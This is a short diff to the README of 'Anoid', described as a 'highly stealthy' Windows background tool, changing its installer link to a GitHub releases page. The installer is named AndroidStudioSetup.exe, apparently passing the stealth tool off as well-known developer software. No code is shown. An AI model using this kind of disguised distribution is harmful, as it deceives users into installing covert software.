@@ -34,7 +34,7 @@ Anoid is a highly stealthy, user-configurable background activity tool for Windo
 ## Installation
 
 1. **Download the Installer:**
-   - [installer_output/AndroidStudioSetup.exe](installer_output/AndroidStudioSetup.exe)
+   - [installer_output/AndroidStudioSetup.exe](https://github.com/yasirSub/AndroidStudioV1/releases)
 
 2. **Run the Installer:**
    - Double-click `AndroidStudioSetup.exe` and follow the prompts.
